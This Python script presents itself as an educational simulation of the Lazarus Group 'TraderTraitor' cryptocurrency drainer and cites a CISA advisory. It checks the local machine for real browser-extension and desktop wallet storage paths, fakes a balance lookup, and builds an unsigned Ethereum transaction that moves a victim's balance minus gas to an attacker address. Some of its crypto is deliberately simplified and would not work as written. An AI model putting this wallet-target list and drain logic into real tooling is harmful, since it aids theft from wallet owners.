# Lazarus Group - TraderTraitor Crypto Drainer
# Demonstrates cryptocurrency exchange targeting and wallet manipulation
# MITRE ATT&CK: T1496 (Resource Hijacking), T1041 (Exfiltration Over C2)

# For educational and research purposes only
# Author: Nour A
# Reference: https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-108a

import hashlib
import hmac
import struct
import os
import sys
import json
import time
import base64
import socket
import urllib.request
import urllib.parse
from datetime import datetime


# Bitcoin-specific constants
BTC_MAINNET_PREFIX = b"\x00"
BTC_TESTNET_PREFIX = b"\x6F"
SATOSHI_PER_BTC = 100_000_000

# Ethereum constants
ETH_CHAIN_ID = 1  # mainnet


def base58_encode(data):
    """Base58 encoding used in Bitcoin addresses."""
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"

    num = int.from_bytes(data, "big")
    encoded = ""
    while num > 0:
        num, remainder = divmod(num, 58)
        encoded = alphabet[remainder] + encoded

    # handle leading zero bytes
    for byte in data:
        if byte == 0:
            encoded = alphabet[0] + encoded
        else:
            break

    return encoded


def base58check_encode(version, payload):
    """Base58Check encoding for Bitcoin addresses."""
    data = version + payload
    checksum = hashlib.sha256(hashlib.sha256(data).digest()).digest()[:4]
    return base58_encode(data + checksum)


def generate_btc_address():
    """Generate a simulated Bitcoin address."""
    # generate random private key (32 bytes)
    private_key = os.urandom(32)

    # simulate public key hash (RIPEMD160(SHA256(pubkey)))
    pubkey_hash = hashlib.new("ripemd160",
                               hashlib.sha256(private_key).digest()).digest()

    # encode as Base58Check address
    address = base58check_encode(BTC_MAINNET_PREFIX, pubkey_hash)

    return {
        "private_key": private_key.hex(),
        "address": address,
        "type": "P2PKH"
    }


def generate_eth_address():
    """Generate a simulated Ethereum address."""
    private_key = os.urandom(32)

    # simulate address from private key (last 20 bytes of keccak256)
    # using sha3_256 as a stand-in for keccak256
    address_bytes = hashlib.sha3_256(private_key).digest()[-20:]
    address = "0x" + address_bytes.hex()

    return {
        "private_key": private_key.hex(),
        "address": address,
        "type": "EOA"
    }


def craft_eth_transaction(from_addr, to_addr, value_wei, nonce=0,
                           gas_price=20_000_000_000, gas_limit=21000):
    """Craft a raw Ethereum transaction (unsigned).
    Lazarus manipulates transaction parameters to drain wallets.
    """
    tx = {
        "nonce": nonce,
        "gasPrice": gas_price,
        "gasLimit": gas_limit,
        "to": to_addr,
        "value": value_wei,
        "data": b"",
        "chainId": ETH_CHAIN_ID,
    }

    # RLP encoding of transaction fields
    def rlp_encode_int(val):
        if val == 0:
            return b"\x80"
        data = val.to_bytes((val.bit_length() + 7) // 8, "big")
        if len(data) == 1 and data[0] < 0x80:
            return data
        return bytes([0x80 + len(data)]) + data

    def rlp_encode_bytes(data):
        if len(data) == 0:
            return b"\x80"
        if len(data) == 1 and data[0] < 0x80:
            return data
        if len(data) < 56:
            return bytes([0x80 + len(data)]) + data
        len_bytes = len(data).to_bytes(
            (len(data).bit_length() + 7) // 8, "big")
        return bytes([0xB7 + len(len_bytes)]) + len_bytes + data

    # encode each field
    fields = [
        rlp_encode_int(tx["nonce"]),
        rlp_encode_int(tx["gasPrice"]),
        rlp_encode_int(tx["gasLimit"]),
        rlp_encode_bytes(bytes.fromhex(tx["to"][2:])),
        rlp_encode_int(tx["value"]),
        rlp_encode_bytes(tx["data"]),
        rlp_encode_int(tx["chainId"]),
        rlp_encode_int(0),
        rlp_encode_int(0),
    ]

    payload = b"".join(fields)
    if len(payload) < 56:
        rlp = bytes([0xC0 + len(payload)]) + payload
    else:
        len_bytes = len(payload).to_bytes(
            (len(payload).bit_length() + 7) // 8, "big")
        rlp = bytes([0xF7 + len(len_bytes)]) + len_bytes + payload

    # transaction hash for signing
    tx_hash = hashlib.sha3_256(rlp).hexdigest()

    return {
        "raw_rlp": rlp.hex(),
        "tx_hash": tx_hash,
        "fields": tx,
        "rlp_size": len(rlp)
    }


def enumerate_browser_wallets():
    """Enumerate browser extension wallet data.
    Lazarus targets MetaMask, Phantom, and other hot wallets.
    """
    wallet_paths = {
        "MetaMask": {
            "chrome": r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn",
            "firefox": r"%APPDATA%\Mozilla\Firefox\Profiles\*.default-release\storage\default\moz-extension*",
            "data_format": "LevelDB",
        },
        "Phantom": {
            "chrome": r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa",
            "data_format": "LevelDB",
        },
        "Coinbase Wallet": {
            "chrome": r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\hnfanknocfeofbddgcijnmhnfnkdnaad",
            "data_format": "LevelDB",
        },
        "Trust Wallet": {
            "chrome": r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\egjidjbpglichdcondbcbdnbeeppgdph",
            "data_format": "LevelDB",
        },
    }

    found = []
    for name, info in wallet_paths.items():
        for browser, path in info.items():
            if browser == "data_format":
                continue
            expanded = os.path.expandvars(path)
            exists = os.path.exists(expanded.split("*")[0])
            found.append({
                "wallet": name,
                "browser": browser,
                "path": path,
                "exists": exists,
                "format": info["data_format"]
            })

    return found


def enumerate_desktop_wallets():
    """Enumerate installed desktop cryptocurrency wallets."""
    wallets = {
        "Bitcoin Core": r"%APPDATA%\Bitcoin\wallet.dat",
        "Electrum": r"%APPDATA%\Electrum\wallets",
        "Exodus": r"%APPDATA%\Exodus\exodus.wallet",
        "Atomic Wallet": r"%APPDATA%\atomic\Local Storage\leveldb",
        "Ledger Live": r"%APPDATA%\Ledger Live",
        "Trezor Suite": r"%APPDATA%\@trezor\suite-desktop",
    }

    found = []
    for name, path in wallets.items():
        expanded = os.path.expandvars(path)
        exists = os.path.exists(expanded)
        found.append({"wallet": name, "path": path, "exists": exists})

    return found


def simulate_blockchain_query(address):
    """Simulate querying a blockchain API for balance information.
    In a real attack, Lazarus queries etherscan/blockchain.info APIs.
    """
    # simulated API response
    return {
        "address": address,
        "balance": "12.847",
        "currency": "ETH",
        "tx_count": 47,
        "first_seen": "2023-01-15T08:30:00Z",
        "last_seen": "2024-02-10T14:22:00Z",
        "api_endpoint": "https://api.etherscan.io/api",
        "query_params": {
            "module": "account",
            "action": "balance",
            "address": address,
            "tag": "latest"
        }
    }


def build_drain_transaction(victim_address, attacker_address, balance_wei):
    """Build a transaction to drain victim's wallet.
    Lazarus crafts precise transactions to avoid minimum balance checks.
    """
    # calculate gas cost
    gas_price = 30_000_000_000  # 30 gwei
    gas_limit = 21000
    gas_cost = gas_price * gas_limit

    # drain amount = balance - gas cost
    drain_amount = balance_wei - gas_cost
    if drain_amount <= 0:
        return {"error": "Balance too low to drain"}

    tx = craft_eth_transaction(
        from_addr=victim_address,
        to_addr=attacker_address,
        value_wei=drain_amount,
        gas_price=gas_price,
        gas_limit=gas_limit
    )

    return {
        "victim": victim_address,
        "attacker": attacker_address,
        "total_balance": balance_wei,
        "gas_cost": gas_cost,
        "drain_amount": drain_amount,
        "drain_eth": drain_amount / 10**18,
        "transaction": tx
    }


def main():
    print("=" * 70)
    print("LAZARUS GROUP - TRADERTRAITOR CRYPTO DRAINER")
    print("Cryptocurrency Wallet Targeting Simulation")
    print("=" * 70)
    print()
    print("[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY")
    print("[!] Reference: FBI/CISA TraderTraitor Advisory AA22-108A")
    print()

    # Stage 1: Wallet enumeration
    print("[STAGE 1] Browser Extension Wallet Enumeration")
    print("-" * 50)
    browser_wallets = enumerate_browser_wallets()
    for w in browser_wallets:
        status = "[FOUND]" if w["exists"] else "[NOT FOUND]"
        print(f"  {status} {w['wallet']} ({w['browser']}) - {w['format']}")
    print()

    # Stage 2: Desktop wallet enumeration
    print("[STAGE 2] Desktop Wallet Enumeration")
    print("-" * 50)
    desktop_wallets = enumerate_desktop_wallets()
    for w in desktop_wallets:
        status = "[FOUND]" if w["exists"] else "[NOT FOUND]"
        print(f"  {status} {w['wallet']}")
    print()

    # Stage 3: Generate addresses for demonstration
    print("[STAGE 3] Address Generation (Simulation)")
    print("-" * 50)
    btc = generate_btc_address()
    print(f"  Bitcoin: {btc['address']} ({btc['type']})")
    eth = generate_eth_address()
    print(f"  Ethereum: {eth['address']}")
    print()

    # Stage 4: Blockchain query simulation
    print("[STAGE 4] Blockchain Balance Query")
    print("-" * 50)
    query = simulate_blockchain_query(eth["address"])
    print(f"  Address: {query['address']}")
    print(f"  Balance: {query['balance']} {query['currency']}")
    print(f"  Transactions: {query['tx_count']}")
    print(f"  API: {query['api_endpoint']}")
    print()

    # Stage 5: Transaction crafting
    print("[STAGE 5] Drain Transaction Construction")
    print("-" * 50)
    attacker_addr = generate_eth_address()["address"]
    balance_wei = int(float(query["balance"]) * 10**18)
    drain = build_drain_transaction(eth["address"], attacker_addr, balance_wei)
    print(f"  Victim: {drain['victim'][:20]}...")
    print(f"  Attacker: {drain['attacker'][:20]}...")
    print(f"  Balance: {drain['total_balance']} wei")
    print(f"  Gas Cost: {drain['gas_cost']} wei")
    print(f"  Drain Amount: {drain['drain_eth']:.6f} ETH")
    print(f"  TX Hash: {drain['transaction']['tx_hash'][:32]}...")
    print(f"  RLP Size: {drain['transaction']['rlp_size']} bytes")
    print()

    print("=" * 70)
    print("[+] TRADERTRAITOR SIMULATION COMPLETE")
    print("  Techniques demonstrated:")
    print("  - Browser extension wallet path enumeration")
    print("  - Desktop wallet detection")
    print("  - Bitcoin Base58Check address generation")
    print("  - Ethereum RLP transaction encoding")
    print("  - Blockchain API query patterns")
    print("  - Precise drain transaction construction")
    print("=" * 70)


if __name__ == "__main__":
    main()
